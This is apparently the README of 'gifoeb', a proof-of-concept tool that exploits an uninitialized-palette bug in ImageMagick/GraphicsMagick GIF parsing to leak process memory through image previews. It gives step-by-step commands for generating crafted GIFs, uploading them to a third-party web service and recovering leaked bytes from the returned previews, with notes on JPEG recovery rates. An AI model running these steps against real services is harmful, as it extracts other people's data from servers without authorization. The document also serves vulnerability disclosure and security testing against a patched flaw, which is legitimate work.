### Summary

ImageMagick/GraphicsMagick's gif parser before https://github.com/ImageMagick/ImageMagick/commit/9fd10cf630832b36a588c1545d8736539b2f1fb5 leaves the palette uninitialized if neither global nor local palette is present. If IM/GM is used as a library loaded into a process that operates on interesting data, this data sometimes can be leaked via the uninitialized palette.

### How to use

1. Run `./gifoeb gen 512x512 dump.gif`. The script needs ImageMagick (default) or GraphicsMagick (use `--tool GM`) to generate the images.
2. Upload `dump.gif` somewhere. If the following conditions hold true
   1. A preview is generated
   2. It is preferably not a JPEG (see notes)
   3. It changes significantly from one upload to another

   then you're lucky.
3. Download and save the preview as `preview.ext`.
4. ```bash
   r=$(identify -format '%wx%h' preview.ext[0]) &&
   mkdir -p for_upload &&
   for i in `seq 1 10`; do
      ./gifoeb gen $r for_upload/$i.gif;
   done
   ```
5. Upload `for_upload/*.gif` to the webservice and download the previews.
6. ```bash
     for p in previews/*; do
       ./gifoeb recover $p | strings;
     done
   ```
7. Repeat 4-6 until you get something interesting or tired.

### Notes on JPEG previews

Unfortunately, conversion to JPEG corrupts the palette at the very first stage --- RGB->YCbCr conversion. All other stages almost don't cause information loss if the picture consists of 16x16 squares of one color and the JPEG conversion quality >= 75. You can still try `gifoeb recover` on JPEG images, but only ~60% bytes will be recovered accurately and others will be recovered with +-1 error. If the resolution of the preview is less than 256x256 then we can't fit all 256 squares and `gifoeb gen` will generate squares of smaller size, so the recover success rate will be even lower.

You can play with image generation and palette recovery alogirithms (see functions `gen_picture` and `recovery` in `gifoeb`). Test it `./gifoeb recover_test --format jpg`, like this:
```
$ ./gifoeb recover_test --format jpg 300x300
test completed, 0 not recovered, 228 wrong, 540 ok
```
